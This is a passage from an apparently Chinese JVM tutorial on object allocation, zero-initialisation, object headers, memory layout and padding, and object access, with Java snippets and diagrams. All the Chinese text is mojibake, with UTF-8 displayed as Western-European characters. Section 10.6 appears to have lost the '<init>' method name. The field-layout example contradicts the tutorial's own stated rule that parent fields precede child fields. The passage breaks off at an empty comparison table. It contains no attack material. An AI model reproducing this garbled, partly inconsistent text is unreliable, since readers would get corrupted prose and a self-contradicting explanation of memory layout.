<p><strong>1. æŒ‡é’ˆç¢°æ’ï¼ˆBump the Pointerï¼‰</strong></p>
<p>é€‚ç”¨åœºæ™¯ï¼šå †å†…å­˜è§„æ•´ï¼ˆä½¿ç”¨æ ‡è®°-æ•´ç†ç®—æ³•ï¼‰</p>
<pre><code class="hljs language-css" lang="css">æŒ‡é’ˆç¢°æ’ï¼š

<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
                 â†‘æŒ‡é’ˆ

åˆ†é…åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[æ–°å¯¹è±¡]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
                         â†‘æŒ‡é’ˆåç§»
</code></pre>
<p><strong>2. ç©ºé—²åˆ—è¡¨ï¼ˆFree Listï¼‰</strong></p>
<p>é€‚ç”¨åœºæ™¯ï¼šå †å†…å­˜ä¸è§„æ•´ï¼ˆä½¿ç”¨æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼‰</p>
<pre><code class="hljs language-ini" lang="ini">ç©ºé—²åˆ—è¡¨ï¼š

å †çŠ¶æ€: <span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡2]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡3]</span>
ç©ºé—²åˆ—è¡¨: <span class="hljs-section">[ä½ç½®1, ä½ç½®3]</span>

åˆ†é…: ä»ç©ºé—²åˆ—è¡¨ä¸­é€‰æ‹©åˆé€‚ä½ç½®

é€‚ç”¨äºå †å†…å­˜ä¸è§„æ•´
</code></pre>
<p><strong>å†…å­˜åˆ†é…å¹¶å‘é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<p><strong>é—®é¢˜ï¼š</strong> å¤šä¸ªçº¿ç¨‹åŒæ—¶åˆ†é…å†…å­˜æ—¶ï¼Œå¯èƒ½å‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ1ï¼šCAS + å¤±è´¥é‡è¯•</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç </span>
<span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
    <span class="hljs-keyword">if</span> (CAS(æŒ‡é’ˆä½ç½®, é¢„æœŸå€¼, æ–°å€¼)) {
        <span class="hljs-comment">// åˆ†é…æˆåŠŸ</span>
        <span class="hljs-keyword">break</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// åˆ†é…å¤±è´¥ï¼Œé‡è¯•</span>
        <span class="hljs-keyword">continue</span>;
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ2ï¼šTLABï¼ˆThread Local Allocation Bufferï¼‰</strong></p>
<p>TLABæ˜¯æ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºä¸­ç‹¬ç«‹çš„å†…å­˜åˆ†é…åŒºåŸŸã€‚</p>
<pre><code class="hljs language-ini" lang="ini">TLABï¼š

EdenåŒº: <span class="hljs-section">[TLAB1]</span> <span class="hljs-section">[TLAB2]</span> <span class="hljs-section">[TLAB3]</span> <span class="hljs-section">[å…±äº«åŒº]</span>
        çº¿ç¨‹1   çº¿ç¨‹2   çº¿ç¨‹3

æ¯ä¸ªçº¿ç¨‹æœ‰ç‹¬ç«‹çš„TLABï¼Œä¼˜å…ˆåœ¨æ­¤åˆ†é…ï¼Œå‡å°‘ç«äº‰
</code></pre>
<p><strong>TLABçš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…å¤šçº¿ç¨‹åˆ†é…å†…å­˜æ—¶çš„ç«äº‰</li>
<li>æé«˜å†…å­˜åˆ†é…æ•ˆç‡</li>
<li>å‡å°‘åŒæ­¥å¼€é”€</li>
</ul>
<h4 data-id="heading-67">10.4 åˆå§‹åŒ–é›¶å€¼</h4>
<p><strong>åˆå§‹åŒ–è¿‡ç¨‹ï¼š</strong></p>
<p>å†…å­˜åˆ†é…å®Œæˆåï¼ŒJVMå°†åˆ†é…çš„å†…å­˜ç©ºé—´åˆå§‹åŒ–ä¸ºé›¶å€¼ï¼ˆä¸åŒ…æ‹¬å¯¹è±¡å¤´ï¼‰ã€‚</p>
<p><strong>åˆå§‹åŒ–çš„å€¼ï¼š</strong></p>
<ul>
<li>åŸºæœ¬ç±»å‹ï¼š0ã€falseã€0.0ç­‰</li>
<li>å¼•ç”¨ç±»å‹ï¼šnull</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦åˆå§‹åŒ–é›¶å€¼ï¼Ÿ</strong></p>
<p>ä¿è¯å¯¹è±¡çš„å®ä¾‹å­—æ®µå¯ä»¥ä¸èµ‹åˆå§‹å€¼å°±ç›´æ¥ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZeroInit</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> value;      <span class="hljs-comment">// è‡ªåŠ¨åˆå§‹åŒ–ä¸º0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> flag;   <span class="hljs-comment">// è‡ªåŠ¨åˆå§‹åŒ–ä¸ºfalse</span>
    <span class="hljs-keyword">private</span> Object obj;     <span class="hljs-comment">// è‡ªåŠ¨åˆå§‹åŒ–ä¸ºnull</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸éœ€è¦å…ˆèµ‹å€¼</span>
        System.out.println(value);  <span class="hljs-comment">// è¾“å‡º0</span>
        System.out.println(flag);   <span class="hljs-comment">// è¾“å‡ºfalse</span>
        System.out.println(obj);    <span class="hljs-comment">// è¾“å‡ºnull</span>
    }
}
</code></pre>
<h4 data-id="heading-68">10.5 è®¾ç½®å¯¹è±¡å¤´</h4>
<p>å¯¹è±¡å¤´åŒ…å«ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š</p>
<p><strong>1. Mark Wordï¼ˆæ ‡è®°å­—æ®µï¼‰</strong></p>
<p>å­˜å‚¨å¯¹è±¡çš„è¿è¡Œæ—¶æ•°æ®ï¼š</p>
<ul>
<li>å¯¹è±¡çš„hashCode</li>
<li>GCåˆ†ä»£å¹´é¾„</li>
<li>é”çŠ¶æ€æ ‡å¿—</li>
<li>çº¿ç¨‹æŒæœ‰çš„é”</li>
<li>åå‘çº¿ç¨‹ID</li>
<li>åå‘æ—¶é—´æˆ³</li>
</ul>
<p><strong>2. ç±»å‹æŒ‡é’ˆï¼ˆClass Pointerï¼‰</strong></p>
<p>æŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼ˆæ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯ï¼‰ã€‚</p>
<p><strong>3. æ•°ç»„é•¿åº¦ï¼ˆå¦‚æœæ˜¯æ•°ç»„ï¼‰</strong></p>
<p>å¦‚æœæ˜¯æ•°ç»„å¯¹è±¡ï¼Œå¯¹è±¡å¤´è¿˜åŒ…å«æ•°ç»„é•¿åº¦ã€‚</p>
<h4 data-id="heading-69">10.6 æ‰§è¡Œæ–¹æ³•</h4>
<p><strong>æ–¹æ³•çš„ä½œç”¨ï¼š</strong></p>
<p>æ–¹æ³•æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œåœ¨å¯¹è±¡åˆ›å»ºçš„æœ€åä¸€æ­¥æ‰§è¡Œã€‚</p>
<p><strong>æ‰§è¡Œå†…å®¹ï¼š</strong></p>
<ol>
<li>æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–å¯¹è±¡</li>
<li>æ‰§è¡Œæ„é€ å‡½æ•°ä¸­çš„ä»£ç </li>
<li>æŒ‰ç…§å£°æ˜é¡ºåºåˆå§‹åŒ–å®ä¾‹å˜é‡</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InitExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> value;
    <span class="hljs-keyword">private</span> String name;
    
    <span class="hljs-comment">// æ„é€ å‡½æ•°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InitExample</span><span class="hljs-params">(<span class="hljs-type">int</span> v, String n)</span> {
        <span class="hljs-built_in">this</span>.value = v;  <span class="hljs-comment">// æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–</span>
        <span class="hljs-built_in">this</span>.name = n;
    }
}

<span class="hljs-comment">// å¯¹è±¡åˆ›å»ºè¿‡ç¨‹ï¼š</span>
<span class="hljs-comment">// 1. ç±»åŠ è½½æ£€æŸ¥</span>
<span class="hljs-comment">// 2. åˆ†é…å†…å­˜</span>
<span class="hljs-comment">// 3. åˆå§‹åŒ–é›¶å€¼ï¼ˆvalue=0, name=nullï¼‰</span>
<span class="hljs-comment">// 4. è®¾ç½®å¯¹è±¡å¤´</span>
<span class="hljs-comment">// 5. æ‰§è¡Œæ„é€ å‡½æ•°ï¼ˆvalue=10, name="test"ï¼‰</span>
<span class="hljs-type">InitExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitExample</span>(<span class="hljs-number">10</span>, <span class="hljs-string">"test"</span>);
</code></pre>
<h3 data-id="heading-70">11. å¯¹è±¡çš„å†…å­˜å¸ƒå±€</h3>
<h4 data-id="heading-71">11.1 å¯¹è±¡å†…å­˜å¸ƒå±€å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡å†…å­˜å¸ƒå±€ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´      â”‚ (Mark Word + ç±»å‹æŒ‡é’ˆ + æ•°ç»„é•¿åº¦)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®    â”‚ (å­—æ®µå€¼)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……    â”‚ (ä¿è¯<span class="hljs-number">8</span>å­—èŠ‚å¯¹é½)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-72">11.2 å¯¹è±¡å¤´è¯¦è§£</h4>
<p><strong>1. Mark Wordï¼ˆæ ‡è®°å­—æ®µï¼‰</strong></p>
<p>Mark Wordæ˜¯å¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡çš„è¿è¡Œæ—¶æ•°æ®ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>





























<table><thead><tr><th>å†…å®¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>hashCode</strong></td><td>å¯¹è±¡çš„å“ˆå¸Œç </td></tr><tr><td><strong>GCå¹´é¾„</strong></td><td>å¯¹è±¡ç»å†çš„GCæ¬¡æ•°</td></tr><tr><td><strong>é”çŠ¶æ€</strong></td><td>åå‘é”ã€è½»é‡çº§é”ã€é‡é‡çº§é”ç­‰</td></tr><tr><td><strong>åå‘çº¿ç¨‹ID</strong></td><td>åå‘é”çš„çº¿ç¨‹ID</td></tr><tr><td><strong>åå‘æ—¶é—´æˆ³</strong></td><td>åå‘é”çš„æ—¶é—´æˆ³</td></tr></tbody></table>
<p><strong>Mark Wordçš„ç»“æ„ï¼ˆ64ä½JVMï¼‰ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         <span class="hljs-selector-tag">Mark</span> Word (<span class="hljs-number">64</span>ä½)            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  é”çŠ¶æ€  â”‚  å…¶ä»–ä¿¡æ¯                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ— é”    â”‚ <span class="hljs-built_in">hashCode</span>(<span class="hljs-number">31</span>ä½) + GCå¹´é¾„(<span class="hljs-number">4</span>ä½) + ...â”‚
â”‚ åå‘é”  â”‚ çº¿ç¨‹<span class="hljs-built_in">ID</span>(<span class="hljs-number">54</span>ä½) + <span class="hljs-built_in">Epoch</span>(<span class="hljs-number">2</span>ä½) + ...â”‚
â”‚ è½»é‡çº§é”â”‚ æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ(<span class="hljs-number">62</span>ä½) + ...â”‚
â”‚ é‡é‡çº§é”â”‚ æŒ‡å‘monitorçš„æŒ‡é’ˆ(<span class="hljs-number">62</span>ä½) + ...â”‚
â”‚ GCæ ‡è®°  â”‚ ç©º(ä¸éœ€è¦è®°å½•ä¿¡æ¯)        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarkWordExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> value;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        
        <span class="hljs-comment">// Mark Wordå­˜å‚¨ï¼š</span>
        <span class="hljs-comment">// - objçš„hashCode</span>
        <span class="hljs-comment">// - GCå¹´é¾„ï¼ˆåˆå§‹ä¸º0ï¼‰</span>
        <span class="hljs-comment">// - é”çŠ¶æ€ï¼ˆåˆå§‹ä¸ºæ— é”ï¼‰</span>
        
        <span class="hljs-comment">// è°ƒç”¨hashCode()æ—¶ï¼Œå¦‚æœhashCodeä¸º0ï¼Œä¼šè®¡ç®—å¹¶å†™å…¥Mark Word</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> obj.hashCode();
        
        <span class="hljs-comment">// ç»å†GCåï¼ŒGCå¹´é¾„å¢åŠ </span>
        <span class="hljs-comment">// åŠ é”æ—¶ï¼Œé”çŠ¶æ€æ”¹å˜</span>
    }
}
</code></pre>
<p><strong>2. ç±»å‹æŒ‡é’ˆï¼ˆClass Pointerï¼‰</strong></p>
<p>ç±»å‹æŒ‡é’ˆæŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼ˆæ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯ï¼‰ã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>JVMé€šè¿‡ç±»å‹æŒ‡é’ˆç¡®å®šå¯¹è±¡æ˜¯å“ªä¸ªç±»çš„å®ä¾‹</li>
<li>æ”¯æŒinstanceofæ“ä½œ</li>
<li>æ”¯æŒè™šæ–¹æ³•åˆ†æ´¾</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassPointerExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);
        
        <span class="hljs-comment">// é€šè¿‡ç±»å‹æŒ‡é’ˆï¼ŒJVMçŸ¥é“objå®é™…ä¸Šæ˜¯Stringç±»å‹</span>
        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> String) {  <span class="hljs-comment">// æ£€æŸ¥ç±»å‹æŒ‡é’ˆ</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> (String) obj;  <span class="hljs-comment">// ç±»å‹è½¬æ¢</span>
        }
    }
}
</code></pre>
<p><strong>3. æ•°ç»„é•¿åº¦ï¼ˆArray Lengthï¼‰</strong></p>
<p>ä»…å½“å¯¹è±¡æ˜¯æ•°ç»„æ—¶ï¼Œå¯¹è±¡å¤´æ‰åŒ…å«æ•°ç»„é•¿åº¦ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayLength</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];  <span class="hljs-comment">// æ•°ç»„å¯¹è±¡ï¼Œå¯¹è±¡å¤´åŒ…å«æ•°ç»„é•¿åº¦10</span>
        
        <span class="hljs-comment">// å¯¹è±¡å¤´ç»“æ„ï¼š</span>
        <span class="hljs-comment">// - Mark Word</span>
        <span class="hljs-comment">// - ç±»å‹æŒ‡é’ˆï¼ˆæŒ‡å‘int[]ç±»ï¼‰</span>
        <span class="hljs-comment">// - æ•°ç»„é•¿åº¦ï¼ˆ10ï¼‰</span>
        <span class="hljs-comment">// - å®ä¾‹æ•°æ®ï¼ˆ10ä¸ªintå€¼ï¼‰</span>
    }
}
</code></pre>
<h4 data-id="heading-73">11.3 å®ä¾‹æ•°æ®</h4>
<p><strong>å®ä¾‹æ•°æ®ï¼ˆInstance Dataï¼‰å­˜å‚¨ï¼š</strong></p>
<p>å¯¹è±¡çš„å®ä¾‹æ•°æ®å­˜å‚¨å¯¹è±¡çš„å®é™…å­—æ®µå€¼ã€‚</p>
<p><strong>å­˜å‚¨é¡ºåºï¼š</strong></p>
<ol>
<li><strong>çˆ¶ç±»å­—æ®µåœ¨å‰</strong>ï¼šçˆ¶ç±»ç»§æ‰¿çš„å­—æ®µåœ¨å­ç±»å­—æ®µä¹‹å‰</li>
<li><strong>ç›¸åŒå®½åº¦çš„å­—æ®µåˆ†é…åœ¨ä¸€èµ·</strong>ï¼šlong/doubleã€int/floatã€short/charã€byte/boolean</li>
<li><strong>å­ç±»å­—æ®µåœ¨å</strong>ï¼šå­ç±»å®šä¹‰çš„å­—æ®µåœ¨çˆ¶ç±»å­—æ®µä¹‹å</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
    <span class="hljs-type">int</span> parentInt;      <span class="hljs-comment">// 4å­—èŠ‚</span>
    <span class="hljs-type">long</span> parentLong;    <span class="hljs-comment">// 8å­—èŠ‚</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Parent</span> {
    <span class="hljs-type">int</span> childInt;       <span class="hljs-comment">// 4å­—èŠ‚</span>
    <span class="hljs-type">long</span> childLong;     <span class="hljs-comment">// 8å­—èŠ‚</span>
}

<span class="hljs-comment">// å¯¹è±¡å¸ƒå±€ï¼ˆå®ä¾‹æ•°æ®éƒ¨åˆ†ï¼‰ï¼š</span>
<span class="hljs-comment">// 1. parentInt (4å­—èŠ‚)</span>
<span class="hljs-comment">// 2. childInt (4å­—èŠ‚) - ç›¸åŒå®½åº¦æ”¾åœ¨ä¸€èµ·</span>
<span class="hljs-comment">// 3. parentLong (8å­—èŠ‚)</span>
<span class="hljs-comment">// 4. childLong (8å­—èŠ‚)</span>
</code></pre>
<h4 data-id="heading-74">11.4 å¯¹é½å¡«å……</h4>
<p><strong>å¯¹é½å¡«å……çš„ä½œç”¨ï¼š</strong></p>
<p>å¯¹è±¡å¤§å°å¿…é¡»æ˜¯8å­—èŠ‚çš„æ•´æ•°å€ï¼Œå¯¹é½å¡«å……ç”¨äºæ»¡è¶³è¿™ä¸ªè¦æ±‚ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å¯¹é½ï¼Ÿ</strong></p>
<ol>
<li><strong>æé«˜è®¿é—®æ•ˆç‡</strong>ï¼šå¯¹é½åçš„å†…å­˜è®¿é—®é€Ÿåº¦æ›´å¿«</li>
<li><strong>ç¡¬ä»¶è¦æ±‚</strong>ï¼šæŸäº›CPUè¦æ±‚æ•°æ®å¯¹é½</li>
<li><strong>å‡å°‘å†…å­˜ç¢ç‰‡</strong>ï¼šå¯¹é½å¯ä»¥å‡å°‘å†…å­˜ç¢ç‰‡</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaddingExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span> b;     <span class="hljs-comment">// 1å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> i;      <span class="hljs-comment">// 4å­—èŠ‚</span>
    
    <span class="hljs-comment">// å¯¹è±¡å¤§å°è®¡ç®—ï¼š</span>
    <span class="hljs-comment">// å¯¹è±¡å¤´ï¼š12å­—èŠ‚ï¼ˆå‡è®¾å‹ç¼©åï¼‰</span>
    <span class="hljs-comment">// bï¼š1å­—èŠ‚</span>
    <span class="hljs-comment">// å¡«å……ï¼š3å­—èŠ‚ï¼ˆä¸ºäº†å¯¹é½ï¼‰</span>
    <span class="hljs-comment">// iï¼š4å­—èŠ‚</span>
    <span class="hljs-comment">// æ€»å¤§å°ï¼š12 + 1 + 3 + 4 = 20å­—èŠ‚</span>
    
    <span class="hljs-comment">// ä½†å¯¹è±¡å¤§å°å¿…é¡»æ˜¯8çš„å€æ•°ï¼Œæ‰€ä»¥ï¼š</span>
    <span class="hljs-comment">// å®é™…å¤§å°ï¼š24å­—èŠ‚ï¼ˆ20 + 4å­—èŠ‚å¯¹é½å¡«å……ï¼‰</span>
}
</code></pre>
<h4 data-id="heading-75">11.5 å¯¹è±¡å¤§å°çš„è®¡ç®—</h4>
<p><strong>è®¡ç®—å…¬å¼ï¼š</strong></p>
<pre><code class="hljs">å¯¹è±¡å¤§å° = å¯¹è±¡å¤´ + å®ä¾‹æ•°æ® + å¯¹é½å¡«å……
</code></pre>
<p><strong>å®é™…è®¡ç®—ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SizeCalculation</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span> b;      <span class="hljs-comment">// 1å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> i;       <span class="hljs-comment">// 4å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> l;      <span class="hljs-comment">// 8å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> Object ref;  <span class="hljs-comment">// å¼•ç”¨4å­—èŠ‚ï¼ˆå‹ç¼©åï¼‰æˆ–8å­—èŠ‚ï¼ˆæœªå‹ç¼©ï¼‰</span>
    
    <span class="hljs-comment">// 64ä½JVMï¼Œå¼€å¯æŒ‡é’ˆå‹ç¼©ï¼š</span>
    <span class="hljs-comment">// å¯¹è±¡å¤´ï¼š12å­—èŠ‚ï¼ˆMark Word 8å­—èŠ‚ + ç±»å‹æŒ‡é’ˆ 4å­—èŠ‚ï¼‰</span>
    <span class="hljs-comment">// bï¼š1å­—èŠ‚</span>
    <span class="hljs-comment">// å¡«å……ï¼š3å­—èŠ‚</span>
    <span class="hljs-comment">// iï¼š4å­—èŠ‚</span>
    <span class="hljs-comment">// lï¼š8å­—èŠ‚</span>
    <span class="hljs-comment">// refï¼š4å­—èŠ‚</span>
    <span class="hljs-comment">// å¯¹é½å¡«å……ï¼š0å­—èŠ‚ï¼ˆå·²ç»æ˜¯8çš„å€æ•°ï¼‰</span>
    <span class="hljs-comment">// æ€»å¤§å°ï¼š12 + 1 + 3 + 4 + 8 + 4 = 32å­—èŠ‚</span>
}
</code></pre>
<h3 data-id="heading-76">12. å¯¹è±¡çš„è®¿é—®å®šä½</h3>
<h4 data-id="heading-77">12.1 å¥æŸ„è®¿é—®æ–¹å¼å›¾</h4>
<pre><code class="hljs language-markdown" lang="markdown">å¥æŸ„è®¿é—®ï¼š

æ ˆå¼•ç”¨ â†’ å¥æŸ„æ±  â†’ å¯¹è±¡å®ä¾‹æ•°æ®
<span class="hljs-code">              â†’ ç±»å‹æ•°æ®
</span>
éœ€è¦ä¸¤æ¬¡è®¿é—®
</code></pre>
<p><strong>å¥æŸ„è®¿é—®çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>å¼•ç”¨ç¨³å®šï¼šå¯¹è±¡ç§»åŠ¨æ—¶åªéœ€æ›´æ–°å¥æŸ„ä¸­çš„æŒ‡é’ˆ</li>
<li>GCæ•ˆç‡é«˜ï¼šGCæ—¶åªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œä¸éœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
</ul>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>éœ€è¦ä¸¤æ¬¡è®¿é—®ï¼šå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡</li>
<li>æ•ˆç‡è¾ƒä½ï¼šå¤šä¸€æ¬¡é—´æ¥è®¿é—®</li>
</ul>
</li>
</ul>
<h4 data-id="heading-78">12.2 ç›´æ¥æŒ‡é’ˆè®¿é—®æ–¹å¼å›¾ï¼ˆHotSpotä½¿ç”¨ï¼‰</h4>
<pre><code class="hljs">ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotï¼‰ï¼š

æ ˆå¼•ç”¨ â†’ å¯¹è±¡å®ä¾‹æ•°æ® â†’ ç±»å‹æ•°æ®ï¼ˆé€šè¿‡å¯¹è±¡å¤´ä¸­ç±»å‹æŒ‡é’ˆï¼‰

åªéœ€ä¸€æ¬¡è®¿é—®
</code></pre>
<p><strong>ç›´æ¥æŒ‡é’ˆè®¿é—®çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>è®¿é—®é€Ÿåº¦å¿«ï¼šåªéœ€ä¸€æ¬¡è®¿é—®</li>
<li>æ•ˆç‡é«˜ï¼šå‡å°‘é—´æ¥è®¿é—®çš„å¼€é”€</li>
</ul>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>å¯¹è±¡ç§»åŠ¨æ—¶éœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
<li>GCæ—¶å¼€é”€è¾ƒå¤§ï¼šéœ€è¦æ›´æ–°æ‰€æœ‰æŒ‡å‘è¯¥å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
</li>
</ul>
<h4 data-id="heading-79">12.3 ä¸¤ç§æ–¹å¼çš„å¯¹æ¯”</h4>



































